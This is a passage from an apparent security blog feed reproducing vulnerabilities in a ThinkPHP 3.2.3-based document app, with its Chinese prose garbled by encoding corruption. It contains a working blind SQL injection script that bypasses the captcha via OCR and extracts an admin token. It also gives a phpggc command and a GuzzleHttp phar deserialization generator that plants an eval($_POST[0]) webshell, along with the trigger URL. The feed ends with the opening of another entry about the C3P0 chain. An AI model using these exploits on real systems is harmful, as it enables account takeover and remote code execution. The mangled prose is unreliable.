src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001041.png" alt="Untitled"></p><p>ÊâÄÊúâËøôÈáåÁöÑ<code>I</code>Êé•Êî∂ÁöÑÂèÇÊï∞ÂêéÈù¢Âè™ËÉΩ‰∏∫Á©∫ÊàñËÄÖsËøô‰∏§ÁßçÔºåÂê¶ÂàôÂ∞±‰ºöË¢´Âº∫ËΩ¨‰∏∫ÂÖ∂ÂÆÉÁöÑÔºåÂæàÊòéÊòæÊ≤°ÊúâÂÅö‰ªª‰ΩïÂ§ÑÁêÜÔºåÁõ¥Êé•ÊãºÊé•Ëøõ‰∫ÜsqlËØ≠Âè•‰∏≠Á¨¶ÂêàË¶ÅÊ±ÇÂç≥Ê≥®ÂÖ•ÁÇπ</p><h3 id="Ê≥®ÂÖ•ËøáÁ®ã"><a href="#Ê≥®ÂÖ•ËøáÁ®ã" class="headerlink" title="Ê≥®ÂÖ•ËøáÁ®ã"></a>Ê≥®ÂÖ•ËøáÁ®ã</h3><p>Âú®Ê≥®ÂÖ•ÁöÑËøáÁ®ã‰∏≠ÈÅáÂà∞‰∫Ü‰∏Ä‰∏™ÁÇπÂ∞±ÊòØ‰∏ãÈù¢ËøôÊÆµÊ£ÄÊµã‰ª£Á†Å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">D</span>(<span class="string">&quot;Captcha&quot;</span>)-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$captcha_id</span>, <span class="variable">$captcha</span>)) &#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sendError</span>(<span class="number">10206</span>, <span class="title function_ invoke__">L</span>(<span class="string">&#x27;verification_code_are_incorrect&#x27;</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂΩìÊó∂ÂçäÂ§©Ê≤°ÊêûÊáÇËøôÊÄé‰πàÁªïÔºåÂêéÈù¢ÁøªËØë‰∫Ü‰∏Ä‰∏ãËøô‰∏™ÂçïËØçÔºåÂÖ∂ÂÆûÂ∞±ÊòØÈ™åËØÅÁ†Å„ÄÇ„ÄÇ„ÄÇÈÇ£‰πàÂ∞±Âè™ÈúÄË¶ÅÂéªÂºÑ‰∏™È™åËØÅÁ†ÅÂ∞±Ë°åÔºåÊäì‰∏Ä‰∏ãÈ™åËØÅÁ†ÅÊé•Âè£ÔºåÂèëÁé∞ËØ∑Ê±ÇÈ™åËØÅÁ†ÅÂàÜ‰∫Ü‰∏§ÈÉ®</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001521.png" alt="Untitled"></p><p>Á¨¨‰∏ÄÊ≠•Â∞±ÊòØÂÖàÂæóÂà∞Ëøô‰∏™<code>captcha_id</code> ÔºåÁÑ∂ÂêéÊ†πÊçÆËøô‰∏™idÂÜçÂéªËØ∑Ê±ÇÈ™åËØÅÁ†Å</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001090.png" alt="Untitled"></p><p>È™åËØÅÁ†ÅÁî®‰∏ÄÊ¨°Â∞±Â§±Êïà‰∫Ü</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001441.png" alt="Untitled"></p><p>ÊàêÂäüÊä•ÈîôÔºåÊé•‰∏ãÊù•Â∞±ÊòØÊ≥®Âá∫Êï∞ÊçÆ‰∫ÜÔºå‰ΩÜÊòØËøô‰∏™È™åËØÅÁ†ÅÂæóËß£ÂÜ≥‰∏Ä‰∏ãÔºå‰∏çÁü•ÈÅì‰∏∫Âï•ÊàëÂ∞èÁöÆËµ∑ÁöÑÁéØÂ¢ÉÂä†ËΩΩÁΩëÈ°µÊÖ¢Ê≠ªÔºåËß£ÂÜ≥È™åËØÅÁ†ÅÊú¨Êù•ÊòØÊÉ≥ÁùÄÁî®<strong>captcha-killer-modified</strong>Ëøô‰∏™Êèí‰ª∂ÁöÑÔºå‰ΩÜÊòØÂÆÉÊúâ‰∏™captcha_idËøôÊ†∑Â∞±‰∏çÊñπ‰æø‰∫ÜÔºåÊâÄ‰ª•Áõ¥Êé•ÂÜôËÑöÊú¨Âà©Áî®ddddocrÂéªËØÜÂà´È™åËØÅÁ†ÅÂç≥ÂèØÔºåËøô‰∏™Ëß£ÂÜ≥ÁÆÄÂçïÔºå‰ΩÜÊòØÂõ†‰∏∫ËøôÈáåÊòØÁõ≤Ê≥®ÊâÄ‰ª•Ê≥®Âá∫Êï∞ÊçÆÂæóÊúâ‰∏™Â∏ÉÂ∞îÊù°‰ª∂ÔºåÁî±‰∫éÊú¨Âú∞ÁéØÂ¢ÉÈóÆÈ¢òÊ≤°ËÉΩÂ•ΩÂ•ΩÂØπÊï∞ÊçÆÂ∫ìËøõË°åË∞ÉËØïÔºåÊó†Â•àÂè™ËÉΩÁúãÂà´‰∫∫ÊÄé‰πàÂºÑÁöÑ‰∫ÜÔºåÈÄ†ÊàêÂ∏ÉÂ∞îÂà§Êñ≠ÊòØÁªìÂêà‰∏ãÈù¢ËøôÈáå</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$password</span> &amp;&amp; <span class="variable">$item</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session</span>(<span class="string">&quot;visit_item_&quot;</span> . <span class="variable">$item_id</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sendResult</span>(<span class="keyword">array</span>(<span class="string">&quot;refer_url&quot;</span> =&gt; <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$refer_url</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sendError</span>(<span class="number">10010</span>, <span class="title function_ invoke__">L</span>(<span class="string">&#x27;access_password_are_incorrect&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåpasswordÊàë‰ª¨ÂèØ‰ª•ËÆæÁΩÆ‰∏∫1ÔºåÈÇ£‰πàÂè™Ë¶Å<code>$item[&#39;password&#39;]</code> ‰∏∫1Âç≥ÂèØËøõÂÖ•if‰∏∫0ËøõÂÖ•elseÔºåÊâÄ‰ª•ËøôÈáåÂè™Ë¶ÅÊûÑÈÄ†Êü•ËØ¢Ê≠£Á°ÆÊó∂<code>$item[&#39;password&#39;]</code> ‰∏∫1ÈîôËØØÊó∂‰∏∫0Â∏ÉÂ∞îÊù°‰ª∂Â∞±Âá∫Êù•‰∫ÜÔºåitemË°®ÁªìÊûÑÂ¶Ç‰∏ã</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002062.png" alt="Untitled"></p><p>password‰∏∫Á¨¨ÂÖ≠Ë°åÔºåÊâÄ‰ª•Êàë‰ª¨Âú®Á¨¨ÂÖ≠Ë°åÂÅö‰∏ÄÊ¨°Â∏ÉÂ∞îÂà§Êñ≠Âç≥ÂèØËææÂà∞ÊúÄÁªàÁöÑÂ∏ÉÂ∞îÊù°‰ª∂Âà§Êñ≠</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002733.png" alt="Untitled"></p><p>ÊàëÊú¨Êú∫ÁöÑtokenÂÄºÁ¨¨‰∏Ä‰ΩçÊòØ9ÔºåÂèØ‰ª•ÁúãÂà∞Ê≠§Êó∂Â∏ÉÂ∞îÂà§Êñ≠‰∏∫1</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002119.png" alt="Untitled"></p><p>ÂΩì‰∏ç‰∏∫9Êó∂Âà§Êñ≠‰∏∫0ÔºåÊâÄ‰ª•ÈÄöËøáÊ≠§ÁßçÊñπÊ≥ïÂç≥ÂèØÊ≥®Âá∫tokenÊï∞ÊçÆÔºåËÑöÊú¨Â¶Ç‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.129:8080&#x27;</span> <span class="comment">#ÁúüÂÆûÁéØÂ¢ÉÈúÄË¶ÅÊõøÊç¢ÁöÑ</span></span><br><span class="line"></span><br><span class="line">ocr = ddddocr.DdddOcr()</span><br><span class="line">table = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_captcha</span>():</span><br><span class="line">    <span class="comment">#Ëé∑ÂèñËØÜÂà´È™åËØÅÁ†Å</span></span><br><span class="line">    <span class="built_in">id</span> = requests.get(url=url+<span class="string">&#x27;/server/index.php?s=/api/common/createCaptcha&#x27;</span>)</span><br><span class="line">    captcha_id = <span class="built_in">id</span>.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;captcha_id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    captcha_re = requests.get(url=url+<span class="string">f&#x27;/server/index.php?s=/api/common/showCaptcha&amp;captcha_id=<span class="subst">&#123;captcha_id&#125;</span>&amp;1717902973000&#x27;</span>)</span><br><span class="line">    captcha = ocr.classification(captcha_re.content) <span class="comment">#Ê≠§ËØÜÂà´‰∏ç‰∏ÄÂÆöÁôæÂàÜÁôæÊ≠£Á°Æ</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> captcha_id,captcha</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Injection</span>():</span><br><span class="line">    captcha_id,captcha = get_captcha()</span><br><span class="line">    token = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">#ÂºÄÂßãÊ≥®ÂÖ•</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span>(table):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                payload = <span class="string">f&quot;1&#x27;) union select 1,2,3,4,5,substr((select token from user_token where uid=1),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;,7,8,9,10,11,12-- &quot;</span></span><br><span class="line">                result = requests.get(url=url + <span class="string">f&#x27;/server/index.php?s=/api/item/pwd&amp;password=1&amp;captcha_id=<span class="subst">&#123;captcha_id&#125;</span>&amp;captcha=<span class="subst">&#123;captcha&#125;</span>&amp;item_id=<span class="subst">&#123;payload&#125;</span>&#x27;</span>,proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;refer_url&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">                    token += j</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Ê≥®Âá∫Êù•ÁöÑtoken‰∏∫Ôºö&quot;</span>+token)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> result.json()[<span class="string">&#x27;error_code&#x27;</span>] == <span class="number">10206</span> :</span><br><span class="line">                    captcha_id,captcha = get_captcha()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(token) == i:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Injection()</span><br></pre></td></tr></table></figure><p>ÊïàÊûúËøòË°åÔºåÂ§ß‰Ω¨‰ª¨ÁúüÊª¥ÁåõÔºåËøô‰∏™Â∏ÉÂ∞îÊù°‰ª∂Ëá™Â∑±ÊâæËøòÁúü‰∏ç‰∏ÄÂÆöÊâæÁöÑÂá∫Êù•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002301.png" alt="Untitled"></p><p>Áî±‰∫éÈâ¥ÊùÉÂü∫Êú¨‰∏äÈÉΩÊòØÈÄöËøáËøô‰∏™tokenÊù•ÁöÑÔºåÊâÄ‰ª•ÊãøÂà∞Ëøô‰∏™tokenÂç≥ÂèØËøõÂÖ•ÂêéÂè∞</p><h2 id="ÂèçÂ∫èÂàóÂåñ"><a href="#ÂèçÂ∫èÂàóÂåñ" class="headerlink" title="ÂèçÂ∫èÂàóÂåñ"></a>ÂèçÂ∫èÂàóÂåñ</h2><p>ËøôÈáåÁõ¥Êé•Áúã3.2.5ÁöÑ‰øÆÂ§çcommit</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002071.png" alt="Untitled"></p><p>Â∞±ÊòØÂ∞ÜËøô‰∏™ÊñπÊ≥ï‰ªépublicÊîπ‰∏∫‰∫ÜprivateÔºåÊù•Âà∞Ëøô‰∏™ÂáΩÊï∞‰∏ãÁúãÁúã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public function new_is_writeable($file)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (is_dir($file)) &#123;</span><br><span class="line">$<span class="built_in">dir</span> = $file;</span><br><span class="line"><span class="keyword">if</span> ($fp = @fopen(<span class="string">&quot;$dir/test.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)) &#123;</span><br><span class="line"><span class="meta">@fclose(<span class="params">$fp</span>);</span></span><br><span class="line"><span class="meta">@unlink(<span class="params"><span class="string">&quot;$dir/test.txt&quot;</span></span>);</span></span><br><span class="line">$writeable = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$writeable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ($fp = @fopen($file, <span class="string">&#x27;a+&#x27;</span>)) &#123;</span><br><span class="line"><span class="meta">@fclose(<span class="params">$fp</span>);</span></span><br><span class="line">$writeable = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$writeable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $writeable;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÈáåÈù¢Êúâ‰∏Ä‰∏™fopenÔºåËøô‰∏™ÂáΩÊï∞ÂèØ‰ª•Ëß¶ÂèëssrfÂíåpharÂèçÂ∫èÂàóÂåñÔºåÊàëÂ∞ùËØï‰∫Ü‰∏Ä‰∏ãssrfÔºåfileÁ°ÆÂÆûÂèØÊéß‰ΩÜÊòØdnslogÂπ∂Ê≤°ÊúâÊî∂Âà∞ËØ∑Ê±Ç</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002315.png" alt="Untitled"></p><p>ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™fileÂ∑≤ÁªèÂèò‰∏∫‰∫ÜÊàëÊåáÂÆöÁöÑdnslogÂú∞ÂùÄÔºåÂêéÊù•Êü•‰∫Ü‰∏Ä‰∏ãËøô‰∏™Â§ßÈÉ®ÂàÜPHPÂπ∂‰∏ç‰ºöÂºÄÂêØfopenÁöÑ gopher wrapperÊâÄ‰ª•ËØ∑Ê±Ç‰∏ç‰ºöÊàêÂäü</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002906.png" alt="Untitled"></p><p>‰ΩÜÊòØËøô‰∏™ÂáΩÊï∞ËøòÂèØ‰ª•ÊãøÊù•Âà©Áî®pharÂèçÂ∫èÂàóÂåñ</p><h3 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h3><p>ÂèçÂ∫èÂàóÂåñÁÇπÂ∑≤ÁªèÊâæÂà∞ÔºåÊé•‰∏ãÊù•ÊâæÊñá‰ª∂‰∏ä‰º†ÂíåÈìæÂ≠êÂç≥ÂèØ Ôºå‰∏ä‰º†ÁÇπÂ•ΩÊâæÔºåËøõÂêéÂè∞Âç≥ÂèØÊâæÂà∞</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002400.png" alt="Untitled"></p><p>ËÆøÈóÆËøô‰∏™Âú∞ÂùÄÂèØ‰ª•ËΩ¨Âà∞ÁúüÂÆûÁöÑÂõæÁâáÂú∞ÂùÄÔºåÊé•‰∏ãÊù•ÂØªÊâæÂèçÂ∫èÂàóÈìæÂç≥ÂèØ</p><p>Ëøô‰∏™docÊòØÂü∫‰∫éthinkphp3.2.3ÔºåÂú®Ëøô‰∏™ÁâàÊú¨ÁöÑthinkphp‰ºº‰πéÊõ¥Â§öÁöÑÊòØsqlÊ≥®ÂÖ•ÔºåËÉΩrceÁöÑ‰∏çÂ§öÔºåÁúãÂ§ß‰Ω¨‰ª¨Áõ¥Êé•Âà©Áî®ÁöÑÊòØGuzzleHttpËøô‰∏™Á¨¨‰∏âÊñπÂ∫ì</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002538.png" alt="Untitled"></p><p>ÂàÜÊûêÊÄùË∑ØÂ∞±ÊòØÁúãÊòØÂê¶Â≠òÂú®composerÔºåÂç≥Á¨¨‰∏âÊñπ‰æùËµñÔºåÁÑ∂ÂêéÂØªÊâæGuzzleHttpÔºåÂèëÁé∞Â≠òÂú®Áõ¥Êé•Êâì</p><p>Âú®phpggcÊï¥Âêà‰∫ÜËøôÊù°ÈìæÁõ¥Êé•ÁîüÊàêÂç≥ÂèØÔºåÂõ†‰∏∫Â≠òÂú®ÁôΩÂêçÂçïÊâÄ‰ª•ÁîüÊàêÂÆÉËøêË°åÁöÑÂêéÁºÄÂç≥ÂèØÔºåÂ§ß‰Ω¨Áõ¥Êé•Áªô‰∫ÜÁîüÊàêÂëΩ‰ª§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Guzzle/FW1 <span class="string">&quot;/var/www/html/Public/Uploads/shell.php&quot;</span> ./shell.php -p phar -pp ./gif -o out.png</span><br></pre></td></tr></table></figure><p>‰ΩÜÊòØÊàëÁõ¥Êé•ÁîüÊàêÁöÑÂõæÁâáÂà©Áî®Â§±Ë¥•Ôºå‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÊàëÊèê‰æõÁöÑÂõæÁâáÈóÆÈ¢ò</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">namespace GuzzleHttp\Cookie &#123;  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">CookieJar</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        private $cookies;  </span><br><span class="line">        public function __construct()  </span><br><span class="line">        &#123;  </span><br><span class="line">            $this-&gt;cookies = array(new SetCookie());  </span><br><span class="line">        &#125;  </span><br><span class="line">        private $strictMode;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FileCookieJar</span> extends CookieJar  </span><br><span class="line">    &#123;  </span><br><span class="line">        private $filename = <span class="string">&quot;/var/www/html/shell.php&quot;</span>;  </span><br><span class="line">        private $storeSessionCookies = true;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SetCookie</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        private $data = array(<span class="string">&#x27;Expires&#x27;</span> =&gt; <span class="string">&#x27;&lt;?php eval($_POST[0]);?&gt;&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">namespace &#123;  </span><br><span class="line">    $phar = new Phar(<span class="string">&quot;shell.phar&quot;</span>); //ÂêéÁºÄÂêçÂøÖÈ°ª‰∏∫phar  </span><br><span class="line">    $phar-&gt;startBuffering();  </span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); //ËÆæÁΩÆstub  </span><br><span class="line">    $o = new \GuzzleHttp\Cookie\FileCookieJar();  </span><br><span class="line">    $phar-&gt;setMetadata($o); //Â∞Ü‚æÉÂÆö‰πâÁöÑmeta-dataÂ≠ò‚ºämanifest  </span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); //Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑ‚ΩÇ‰ª∂  </span><br><span class="line">    //Á≠æÂêç‚æÉÂä®ËÆ°ÁÆó  </span><br><span class="line">    $phar-&gt;stopBuffering();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âà©Áî®Ëøô‰∏™ËÑöÊú¨ÁîüÊàêpharÔºåÁÑ∂ÂêéÊâãÂä®ÊîπÂêéÁºÄ‰∏∫jpgÔºå‰∏ä‰º†ÂêéÊãøÂú∞ÂùÄÂú®ÂèçÂ∫èÂàóÂåñÁÇπÊâì‰∏Ä‰∏ãÂç≥ÂèØ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/server/index.php?s=/home/index/new_is_writeable&amp;file=phar://Public/Uploads/<span class="number">2024</span>-06-<span class="number">15</span>/666d7515df4fd.jpg</span><br></pre></td></tr></table></figure><p>Âà©Áî®ÊàêÂäü</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152002860.png" alt="Untitled"></p><h2 id="‰∏ÄÁÇπÊÑüÊÇü"><a href="#‰∏ÄÁÇπÊÑüÊÇü" class="headerlink" title="‰∏ÄÁÇπÊÑüÊÇü"></a>‰∏ÄÁÇπÊÑüÊÇü</h2><p>Âú®Ëøô‰∏™ÊºèÊ¥ûÊ≤°ÂÖ¨ÂºÄpocÊó∂ÊàëÂ∞±Âú®Â∞ùËØïÂ§çÁé∞Ôºå‰ΩÜÊòØÂΩìÊó∂Âú®ÂØπÁùÄcommitÊ≠ªÁ£ïÈÇ£‰∏™sqlÊ≥®ÂÖ•ÔºåÁ£ï‰∫Ü‰∏ÄÂ§©ËøûÊ≥®ÂÖ•ÁÇπÈÉΩÊ≤°ÊâæÂà∞‰ª•‰∏∫ÂæàÈöæÂ∞±Ê≤°Áúã‰∫ÜÔºåÂàÜÊûêÊñáÁ´†Âá∫Êù•ÂêéËôΩÁÑ∂Âà©Áî®ÊúâÈöæÂ∫¶Ôºå‰ΩÜÊòØÊâæÂà∞Âà©Áî®ÁÇπËøòÊòØÊå∫ÁÆÄÂçïÁöÑÔºå‰ª•ÂêéÂÜçÂÅöÁ±ª‰ººÂ§çÁé∞ËøòÊòØÂæóÁÅµÊ¥ª‰∏ÄÁÇπ„ÄÇ„ÄÇ„ÄÇ„ÄÇ</p><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><p><a href="https://xz.aliyun.com/t/14802">https://xz.aliyun.com/t/14802</a></p><p><a href="https://xz.aliyun.com/t/14808">https://xz.aliyun.com/t/14808</a></p>]]></content>
      
      
      <categories>
          
          <category> ‰ª£Á†ÅÂÆ°ËÆ° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C3P0ÈìæÂ≠¶‰π†</title>
      <link href="/2024/04/C3P0%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/04/C3P0%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ÂÖàÁúãÁúãC3p0ÊòØÂπ≤‰ªÄ‰πàÁöÑ</p><blockquote><p>C3P0ÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑJDBCËøûÊé•Ê±†ÔºåÂÆÉÂÆûÁé∞‰∫ÜÊï∞ÊçÆÊ∫êÂíåJNDIÁªëÂÆöÔºåÊîØÊåÅJDBC3ËßÑËåÉÂíåJDBC2ÁöÑÊ†áÂáÜÊâ©Â±ï„ÄÇÁõÆÂâç‰ΩøÁî®ÂÆÉÁöÑÂºÄÊ∫êÈ°πÁõÆÊúâHibernateÔºåSpringÁ≠â„ÄÇ</p></blockquote><blockquote><p>JDBCÊòØJava DataBase ConnectivityÁöÑÁº©ÂÜôÔºåÂÆÉÊòØJavaÁ®ãÂ∫èËÆøÈóÆÊï∞ÊçÆÂ∫ìÁöÑÊ†áÂáÜÊé•Âè£„ÄÇ<br>‰ΩøÁî®JavaÁ®ãÂ∫èËÆøÈóÆÊï∞ÊçÆÂ∫ìÊó∂ÔºåJava‰ª£Á†ÅÂπ∂‰∏çÊòØÁõ¥Êé•ÈÄöËøáTCPËøûÊé•ÂéªËÆøÈóÆÊï∞ÊçÆÂ∫ìÔºåËÄåÊòØÈÄöËøáJDBCÊé•Âè£Êù•ËÆøÈóÆÔºåËÄåJDBCÊé•Âè£ÂàôÈÄöËøáJDBCÈ©±Âä®Êù•ÂÆûÁé∞ÁúüÊ≠£ÂØπÊï∞ÊçÆÂ∫ìÁöÑËÆøÈóÆ„ÄÇ</p></blockquote><blockquote><p>ËøûÊé•Ê±†Á±ª‰ºº‰∫éÁ∫øÁ®ãÊ±†ÔºåÂú®‰∏Ä‰∫õÊÉÖÂÜµ‰∏ãÊàë‰ª¨‰ºöÈ¢ëÁπÅÂú∞Êìç‰ΩúÊï∞ÊçÆÂ∫ìÔºåÊ≠§Êó∂JavaÂú®ËøûÊé•Êï∞ÊçÆÂ∫ìÊó∂‰ºöÈ¢ëÁπÅÂú∞ÂàõÂª∫ÊàñÈîÄÊØÅÂè•ÊüÑÔºåÂ¢ûÂ§ßËµÑÊ∫êÁöÑÊ∂àËÄó„ÄÇ‰∏∫‰∫ÜÈÅøÂÖçËøôÊ†∑‰∏ÄÁßçÊÉÖÂÜµÔºåÊàë‰ª¨ÂèØ‰ª•ÊèêÂâçÂàõÂª∫Â•Ω‰∏Ä‰∫õËøûÊé•Âè•ÊüÑÔºåÈúÄË¶Å‰ΩøÁî®Êó∂Áõ¥Êé•‰ΩøÁî®Âè•ÊüÑÔºå‰∏çÈúÄË¶ÅÊó∂ÂèØÂ∞ÜÂÖ∂ÊîæÂõûËøûÊé•Ê±†‰∏≠ÔºåÂáÜÂ§á‰∏ã‰∏ÄÊ¨°ÁöÑ‰ΩøÁî®„ÄÇÁ±ª‰ººËøôÊ†∑‰∏ÄÁßçËÉΩÂ§üÂ§çÁî®Âè•ÊüÑÁöÑÊäÄÊúØÂ∞±ÊòØÊ±†ÊäÄÊúØ„ÄÇ</p></blockquote><p>ËØ¥ÂÆûËØùÔºåËøòÊòØÊ≤°ËÉΩÁêÜËß£Âú®ÂºÄÂèë‰∏≠ÁöÑ‰ΩúÁî®ÔºåËøòÊòØÂæóÂºÄÂèëÂÆûÊàò‰∏Ä‰∏ãÊâçËÉΩÁêÜËß£„ÄÇ„ÄÇ„ÄÇ